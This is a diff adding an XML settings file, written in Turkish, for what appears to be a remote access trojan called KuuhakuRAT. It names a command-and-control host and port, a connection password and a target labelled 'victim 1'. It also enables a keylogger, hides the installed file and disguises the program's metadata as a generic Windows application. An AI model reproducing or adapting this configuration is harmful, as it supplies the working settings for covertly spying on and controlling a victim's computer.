@@ -1,0 +1,28 @@
+<ayarlar>
+  <Etiket>Kurban1</Etiket>
+  <Hostlar>kuuhakurat.zapto.org:4782;</Hostlar>
+  <Şifre>1234</Şifre>
+  <Gecikme>3000</Gecikme>
+  <Mutex>KHK_MUTEX_dKG9iNDğPAonqqw3PF</Mutex>
+  <ClientKurumu>False</ClientKurumu>
+  <Yüklemeİsmi>Sanji</Yüklemeİsmi>
+  <KurulumDizini>1</KurulumDizini>
+  <SubDirYükle>SubDir</SubDirYükle>
+  <DosyaSakla>True</DosyaSakla>
+  <BaşlangıcaEkle>False</BaşlangıcaEkle>
+  <RegistryName>Sanji</RegistryName>
+  <İkonDeğiştir>True</İkonDeğiştir>
+  <IconPath>C:\Users\Asus\Desktop\KuuhakuRAT\Server\Kuuhaku_Server.ico</IconPath>
+  <ChangeAsmInfo>False</ChangeAsmInfo>
+  <Keylogger>True</Keylogger>
+  <LogDirectoryName>Kayıtlar</LogDirectoryName>
+  <HideLogDirectory>False</HideLogDirectory>
+  <Ürünİsmi>WindowsFormsApplication3</Ürünİsmi>
+  <Açıklama>WindowsFormsApplication3</Açıklama>
+  <Şirketİsmi>Kuuhaku</Şirketİsmi>
+  <TelifHakkı>Copyright © 2016</TelifHakkı>
+  <Trademarks>Kuuhaku</Trademarks>
+  <OriginalFilename>WindowsFormsApplication3.exe</OriginalFilename>
+  <ÜrünVersiyonu>1.0.0.0</ÜrünVersiyonu>
+  <DosyaVersiyonu>1.0.0.0</DosyaVersiyonu>
+</ayarlar>
